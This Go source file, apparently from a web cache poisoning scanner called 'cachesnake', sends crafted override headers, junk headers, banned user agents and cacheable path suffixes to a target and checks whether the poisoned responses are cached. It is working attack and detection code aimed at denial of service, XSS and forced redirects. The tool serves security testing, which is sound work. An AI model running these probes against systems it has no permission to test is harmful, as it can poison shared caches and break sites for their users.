package cachesnake

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func RunAttacks(target *AttackTarget, timeout time.Duration, backoff time.Duration) AttackResult {
	//Setup HTTP context
	net_ctx := HttpContext{
		PersistentHeaders: make([][]string, 0),
		Cookies:           make([][]string, 0),
	}

	net_ctx.Client = &fasthttp.Client{
		DisableHeaderNamesNormalizing: true,
		DisablePathNormalizing:        true,
		ReadTimeout:                   timeout,
		Name:                          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
	}

	net_ctx.Request = fasthttp.AcquireRequest()
	net_ctx.Response = fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(net_ctx.Request)
	defer fasthttp.ReleaseResponse(net_ctx.Response)

	//Setting Up the result object
	result := AttackResult{
		Target:      target,
		VulnList:    make([]Vuln, 0, 10),
		TimeStarted: time.Now(),
	}

	//Run the attacks & aggregate results
	//if target.cookie_search_only {

	//}

	// Try Host override
	attack_works, attack_headers := RunHostOverride(target, &net_ctx, backoff)
	if attack_works {
		v := Vuln{
			Name:             "Host Override",
			Details:          "",
			OffendingHeaders: make([]string, len(attack_headers)),
			Impact:           []string{"DoS", "XSS"},
			TimeFound:        time.Now(),
		}
		copy(v.OffendingHeaders, attack_headers)

		result.VulnList = append(result.VulnList, v)
	}

	// Try path override
	attack_works, attack_headers = RunPathOverride(target, &net_ctx, backoff)
	if attack_works {
		v := Vuln{
			Name:             "Path Override",
			Details:          "",
			OffendingHeaders: make([]string, len(attack_headers)),
			Impact:           []string{"DoS"},
			TimeFound:        time.Now(),
		}
		copy(v.OffendingHeaders, attack_headers)

		result.VulnList = append(result.VulnList, v)
	}

	// Try Illegal header
	attack_works, _ = RunIllegalHeader(target, &net_ctx, backoff)
	if attack_works {
		v := Vuln{
			Name:             "Illegal Header",
			Details:          "",
			OffendingHeaders: []string{"]"},
			Impact:           []string{"DoS"},
			TimeFound:        time.Now(),
		}

		result.VulnList = append(result.VulnList, v)
	}

	// Try Many Headers
	attack_works, _ = RunLargeHeaderCount(target, &net_ctx, backoff)
	if attack_works {
		v := Vuln{
			Name:             "Large Header Count",
			Details:          "",
			OffendingHeaders: []string{"X-Random-Custom-Header"},
			Impact:           []string{"DoS"},
			TimeFound:        time.Now(),
		}

		result.VulnList = append(result.VulnList, v)
	}

	// Try Method override
	attack_works, attack_headers = RunMethodOverride(target, &net_ctx, backoff)
	if attack_works {
		v := Vuln{
			Name:             "Method Override",
			Details:          "",
			OffendingHeaders: make([]string, len(attack_headers)),
			Impact:           []string{"DoS"},
			TimeFound:        time.Now(),
		}
		copy(v.OffendingHeaders, attack_headers)

		result.VulnList = append(result.VulnList, v)
	}

	// Try Evil Agent
	attack_works, attack_headers = RunEvilAgent(target, &net_ctx, backoff)
	if attack_works {
		v := Vuln{
			Name:             "Evil User-Agent",
			Details:          "",
			OffendingHeaders: make([]string, len(attack_headers)),
			Impact:           []string{"DoS"},
			TimeFound:        time.Now(),
		}
		copy(v.OffendingHeaders, attack_headers)

		result.VulnList = append(result.VulnList, v)
	}

	// Try Protocol override
	attack_works, attack_headers = RunProtoOverride(target, &net_ctx, backoff)
	if attack_works {
		v := Vuln{
			Name:             "Protocol Override",
			Details:          "",
			OffendingHeaders: make([]string, len(attack_headers)),
			Impact:           []string{"DoS"},
			TimeFound:        time.Now(),
		}
		copy(v.OffendingHeaders, attack_headers)

		result.VulnList = append(result.VulnList, v)

		// If we can perform protocol override try to see if we can execute a permanent redirect
		if len(attack_headers) > 0 {
			persisten_headers_backup := make([][]string, len(net_ctx.PersistentHeaders))
			copy(persisten_headers_backup, net_ctx.PersistentHeaders)

			net_ctx.PersistentHeaders = append(net_ctx.PersistentHeaders, []string{attack_headers[0], "http"})

			permaredir_works, permaredir_headers := RunPermaRedirect(target, &net_ctx, backoff)
			if permaredir_works {
				v := Vuln{
					Name:             "Permanent Redirect",
					Details:          "",
					OffendingHeaders: make([]string, len(permaredir_headers)),
					Impact:           []string{"XSS", "DoS"},
					TimeFound:        time.Now(),
				}
				copy(v.OffendingHeaders, permaredir_headers)

				result.VulnList = append(result.VulnList, v)
			}
		}
	}

	// Try Port override
	attack_works, attack_headers = RunPortOverride(target, &net_ctx, backoff)
	if attack_works {
		v := Vuln{
			Name:             "Protocol Override",
			Details:          "",
			OffendingHeaders: make([]string, len(attack_headers)),
			Impact:           []string{"DoS"},
			TimeFound:        time.Now(),
		}
		copy(v.OffendingHeaders, attack_headers)

		result.VulnList = append(result.VulnList, v)

		// If we can perform protocol override try to see if we can execute a permanent redirect
		if len(attack_headers) > 0 {
			persisten_headers_backup := make([][]string, len(net_ctx.PersistentHeaders))
			copy(persisten_headers_backup, net_ctx.PersistentHeaders)

			net_ctx.PersistentHeaders = append(net_ctx.PersistentHeaders, []string{attack_headers[0], "80"})

			permaredir_works, permaredir_headers := RunPermaRedirect(target, &net_ctx, backoff)
			if permaredir_works {
				v := Vuln{
					Name:             "Permanent Redirect",
					Details:          "",
					OffendingHeaders: make([]string, len(permaredir_headers)),
					Impact:           []string{"XSS", "DoS"},
					TimeFound:        time.Now(),
				}
				copy(v.OffendingHeaders, permaredir_headers)

				result.VulnList = append(result.VulnList, v)
			}
		}
	}

	// Try permanent redirect & port dos
	if target.InitialResponse.StatusCode() >= 301 && target.InitialResponse.StatusCode() <= 308 {

		attack_works, attack_headers = RunPermaRedirect(target, &net_ctx, backoff)
		if attack_works {
			v := Vuln{
				Name:             "Permanent Redirect",
				Details:          "",
				OffendingHeaders: make([]string, len(attack_headers)),
				Impact:           []string{"DoS", "XSS"},
				TimeFound:        time.Now(),
			}
			copy(v.OffendingHeaders, attack_headers)

			result.VulnList = append(result.VulnList, v)
		}

		attack_works, attack_headers = RunPortDos(target, &net_ctx, backoff)
		if attack_works {
			v := Vuln{
				Name:             "Port DoS",
				Details:          "",
				OffendingHeaders: make([]string, len(attack_headers)),
				Impact:           []string{"DoS"},
				TimeFound:        time.Now(),
			}
			copy(v.OffendingHeaders, attack_headers)

			result.VulnList = append(result.VulnList, v)
		}

	}

	// Finally, try header bruteforce
	bruteforce_result := RunBruteforce(target, &net_ctx, backoff)

	if len(bruteforce_result) > 0 {
		for _, r := range bruteforce_result {
			v := Vuln{
				Name:             "Header Bruteforce",
				Details:          "",
				OffendingHeaders: []string{r.OffendingHeader},
				Impact:           make([]string, 0, 2),
				TimeFound:        time.Now(),
			}

			if r.IsCached {
				v.Details += "Cached. "
			}
			if r.IsCacheable {
				v.Details += "Forcibly cacheable. Postfix: \"" + r.CacheablePostfix + "\". "
			}

			for _, reason := range r.Reasons {
				switch reason {
				case reason_StatusCodeModified:
					v.Details += "Status code modified. "
					v.Impact = append(v.Impact, "DoS")
				case reason_ValueReflectedBody:
					v.Details += "Value reflected in body. "
					v.Impact = append(v.Impact, "XSS")
				}
			}

			result.VulnList = append(result.VulnList, v)
		}
	}

	//Note the time & return
	result.TimeStopped = time.Now()
	return result
}

// Attempt to cause a 404
// Main Impact: DoS, Inappropriate Content displayed.
func RunPathOverride(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	//If not 200 there's nothing to do
	if target.InitialResponse.StatusCode() != 200 {
		return false, nil
	}

	//Prepare headers & header bin search args
	header_value_pairs := make([][]string, len(PathOverrideHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{PathOverrideHeaders[i], "/404doesntexist"}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  false,
		DisableSpecialHeaders: false,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          DecisionFuncStatusCodeModified,
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v.ShouldKeep {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Attempt to cause a redirect
// Main Impact: DoS, possible redirect
func RunProtoOverride(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	//If not 200 there's nothing to do
	if target.InitialResponse.StatusCode() != 200 {
		return false, nil
	}

	//Prepare headers & header bin search args
	header_value_pairs := make([][]string, len(ProtocolOverrideHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{ProtocolOverrideHeaders[i], "http"}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  false,
		DisableSpecialHeaders: false,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          DecisionFuncStatusCodeRedirect,
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v.ShouldKeep {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Attempt to cause a redirect
// Main Impact: DoS, possible permenant redirect
func RunPortOverride(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	//If not 200 there's nothing to do
	if target.InitialResponse.StatusCode() != 200 {
		return false, nil
	}

	//Prepare headers & header bin search args
	header_value_pairs := make([][]string, len(PortOverrideHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{PortOverrideHeaders[i], "80"}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  false,
		DisableSpecialHeaders: false,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          DecisionFuncStatusCodeModified,
		//we use the same decision function as path override
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v.ShouldKeep {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Attempt to cause an error page through too many headers
// Main Impact: DoS
func RunLargeHeaderCount(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	//Setup the request URL & method
	net_ctx.Request.SetRequestURI(target.TargetURL)
	net_ctx.Request.Header.SetMethod("GET")

	//Set URL params & cache buster headers
	cache_buster := GenRandString(10)
	query_params := net_ctx.Request.URI().QueryArgs()
	query_params.Add("cachebuster", cache_buster)

	net_ctx.Request.Header.Set("Accept", "*/*, text/"+cache_buster)

	//Add persistent headers if any
	for _, h_v := range net_ctx.PersistentHeaders {
		net_ctx.Request.Header.Set(h_v[0], h_v[1])
	}

	//Set 130 random headers
	for i := 0; i < 130; i++ {
		net_ctx.Request.Header.Add("X-Random-Custom-Header", GenRandString(15))
	}

	//Send the request with the header
	err := net_ctx.Client.Do(net_ctx.Request, net_ctx.Response)
	if err != nil {
		return false, nil
	}

	//Note the result with the headers present
	result_with_header := net_ctx.Response.StatusCode() != target.InitialResponse.StatusCode()

	//No need for a second request if we don't have an error page in the first place
	if !result_with_header {
		return false, nil
	}

	//Remove headers
	net_ctx.Request.Header.Del("X-Random-Custom-Header")

	//Resend the request without the headers
	err = net_ctx.Client.Do(net_ctx.Request, net_ctx.Response)
	if err != nil {
		return false, nil
	}

	//Note result without the header present
	result_without_header := net_ctx.Response.StatusCode() != target.InitialResponse.StatusCode()

	//The result is cached only if both tests are true
	return result_with_header && result_without_header, nil
}

// Attempt to cause a HEAD response
// Main Impact: DoS
func RunMethodOverride(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	//If not 200 there's nothing to do
	if target.InitialResponse.StatusCode() != 200 {
		return false, nil
	}

	//Prepare headers & header bin search args
	header_value_pairs := make([][]string, len(MethodOverrideHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{MethodOverrideHeaders[i], "HEAD"}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  false,
		DisableSpecialHeaders: false,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          DecisionFuncSmallBody,
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v.ShouldKeep {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Attempt to cause a permanent redirect
// Main Impact: Redirect, XSS
func RunPermaRedirect(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	// WE WON'T CHECK IF IT'S A REDIRECT: because maybe some persistent headers turn the response into a redirect
	//If not redirect there's nothing to do
	// if target.InitialResponse.StatusCode() > 308 || target.InitialResponse.StatusCode() < 301 {
	// 	return false, nil
	// }

	//Prepare headers & header bin search args
	header_value_pairs := make([][]string, len(HostOverrideHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{HostOverrideHeaders[i], "www.elbo7.com"}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  true,
		DisableSpecialHeaders: true,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          DecisionFuncLocationHeader,
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v.ShouldKeep {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Attempt to cause an error page through banned user agent
// Main Impact: DoS
func RunEvilAgent(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	result := make([]string, 0, 2)

	for _, ua := range EvilUserAgents {
		//Reset request & response objects
		net_ctx.Request.Reset()
		net_ctx.Response.Reset()

		//Setup the request URL & method
		net_ctx.Request.SetRequestURI(target.TargetURL)
		net_ctx.Request.Header.SetMethod("GET")

		//Set URL params & cache buster headers
		cache_buster := GenRandString(10)
		query_params := net_ctx.Request.URI().QueryArgs()
		query_params.Add("cachebuster", cache_buster)

		net_ctx.Request.Header.Set("Accept", "*/*, text/"+cache_buster)

		//Add persistent headers if any
		for _, h_v := range net_ctx.PersistentHeaders {
			net_ctx.Request.Header.Set(h_v[0], h_v[1])
		}

		//Set Evil User-agent
		net_ctx.Request.Header.SetUserAgent(ua)

		//Send the request with the header
		err := net_ctx.Client.Do(net_ctx.Request, net_ctx.Response)
		if err != nil {
			return false, nil
		}

		//Note the result with the headers present
		result_with_header := net_ctx.Response.StatusCode() != target.InitialResponse.StatusCode()

		//If no change move on to the next user-agent
		if !result_with_header {
			continue
		}

		//Resend the request without the headers
		err = net_ctx.Client.Do(net_ctx.Request, net_ctx.Response)
		if err != nil {
			return false, nil
		}

		//Note result without the header present
		result_without_header := net_ctx.Response.StatusCode() != target.InitialResponse.StatusCode()

		if result_without_header {
			result = append(result, ua)
		}
	}

	//Finally return the result if any
	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Attempt to cause a Host override
// Main Impact: DoS, XSS
func RunHostOverride(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	//Prepare headers & header bin search args
	random_host := "www." + GenRandString(16) + ".com"
	header_value_pairs := make([][]string, len(HostOverrideHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{HostOverrideHeaders[i], random_host}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  true,
		DisableSpecialHeaders: true,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          DecisionFuncHostOverride,
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v.ShouldKeep {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Attempt to cause a Port dos
// Main Impact: DoS
func RunPortDos(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	// WE WON'T CHECK IF IT'S A REDIRECT: because maybe some persistent headers turn the response into a redirect
	//If not redirect there's nothing to do
	// if target.InitialResponse.StatusCode() > 308 || target.InitialResponse.StatusCode() < 301 {
	// 	return false, nil
	// }

	//Prepare headers & header bin search args
	uri_obj := fasthttp.AcquireURI()
	uri_obj.Parse(nil, []byte(target.TargetURL))
	target_host := string(uri_obj.Host()) + ":1337"
	defer fasthttp.ReleaseURI(uri_obj)

	header_value_pairs := make([][]string, len(HostOverrideHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{HostOverrideHeaders[i], target_host}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  true,
		DisableSpecialHeaders: true,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          DecisionFuncLocationHeader,
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v.ShouldKeep {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Attempt to cause a 400 through illegal header
// Main Impact: DoS
func RunIllegalHeader(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	//If not 200 there's nothing to do
	if target.InitialResponse.StatusCode() != 200 {
		return false, nil
	}

	//Prepare headers & header bin search args
	header_value_pairs := [][]string{{"]", "illegal-header-value"}}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  true,
		DisableSpecialHeaders: false,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             1,
		Backoff:               backoff,
		DecisionFunc:          DecisionFuncStatusCodeModified,
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return false, nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	result := make([]string, 0, len(bin_search_result))

	for i, v := range cache_test_result {
		if v.ShouldKeep {
			result = append(result, bin_search_result[i][0])
		}
	}

	if len(result) == 0 {
		return false, nil
	} else {
		return true, result
	}
}

// Try many different headers
// Main Impact: Header dependant
func RunBruteforce(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) []HeaderBruteforceResult {
	//necessary boilerplate
	target.AcquireTarget(backoff)
	defer target.ReleaseTarget()
	defer target.MarkRequested()
	//clear the request and response objects, they will be reused by the next function
	defer net_ctx.Request.Reset()
	defer net_ctx.Response.Reset()

	//If not 200 there's nothing to do
	if target.InitialResponse.StatusCode() != 200 {
		return nil
	}

	//Prepare headers & header bin search args
	header_value_pairs := make([][]string, len(AllHeaders))
	for i := range header_value_pairs {
		header_value_pairs[i] = []string{AllHeaders[i], "wcpcanary007" + GenRandString(10)}
	}

	args := HeaderBinarySearchArgs{
		Target:                target,
		NetCtx:                net_ctx,
		DisableNormalization:  true,
		DisableSpecialHeaders: true,
		UsePersistentHeaders:  true,
		UseCookies:            false,
		HeaderValuePairs:      header_value_pairs,
		ChunkSize:             40,
		Backoff:               backoff,
		DecisionFunc:          DecisionFuncBruteforce,
	}

	//Run Binary search on Headers
	bin_search_result := HeaderBinarySearch(&args)

	if len(bin_search_result) == 0 {
		return nil
	}

	//See if any results are cached
	args.HeaderValuePairs = bin_search_result
	cache_test_result := IsHeaderEffectCached(&args)

	if len(cache_test_result) == 0 {
		return nil
	}

	result := make([]HeaderBruteforceResult, 0, len(bin_search_result))

	//Check for cached results or uncached results that can be forced
	for i, v := range cache_test_result {
		//add cached values to the result
		if v.ShouldKeep {
			r := HeaderBruteforceResult{
				OffendingHeader:  bin_search_result[i][0],
				Reasons:          v.Reasons,
				IsCached:         true,
				IsCacheable:      false,
				CacheablePostfix: "",
			}
			result = append(result, r)
			continue
		}

		// not cached, check if it should be tested for forcing
		shouldTest := false
		for _, reason := range v.Reasons {
			shouldTest = shouldTest || (reason == reason_ValueReflectedBody || reason == reason_SetCookiePresent)
		}

		if !shouldTest {
			continue
		}

		// The value should be tested to see if we can force caching
		CacheablePostfixes := []string{"/cache" + GenRandString(5) + ".css", ".css", "/.css", "%0Acache" + GenRandString(5) + ".css", "%3Bcache" + GenRandString(5) + ".css", "%23cache" + GenRandString(5) + ".css", "%3Fcache" + GenRandString(5) + ".css"}
		newArgs := args
		for _, postfix := range CacheablePostfixes {
			//Remove request params, trailing slash & add postfix
			newTarget := *args.Target
			newTarget.TargetURL, _ = strings.CutSuffix(strings.Split(newTarget.TargetURL, "?")[0], "/")
			newTarget.TargetURL += postfix
			newArgs.Target = &newTarget
			newArgs.HeaderValuePairs = [][]string{bin_search_result[i]}

			decision := IsHeaderEffectCached(&newArgs)[0]
			validReasons := false
			for _, reason := range decision.Reasons {
				validReasons = validReasons || (reason == reason_ValueReflectedBody || reason == reason_SetCookiePresent)
			}

			if decision.ShouldKeep && validReasons {
				r := HeaderBruteforceResult{
					OffendingHeader:  bin_search_result[i][0],
					Reasons:          v.Reasons,
					IsCached:         false,
					IsCacheable:      true,
					CacheablePostfix: postfix,
				}
				result = append(result, r)
				break
			}
			//Respect the backoff time or face the wrath of the rate-limiter
			time.Sleep(args.Backoff)
		}

	}

	if len(result) == 0 {
		return nil
	} else {
		return result
	}
}

func RunCookieSearch() {

}
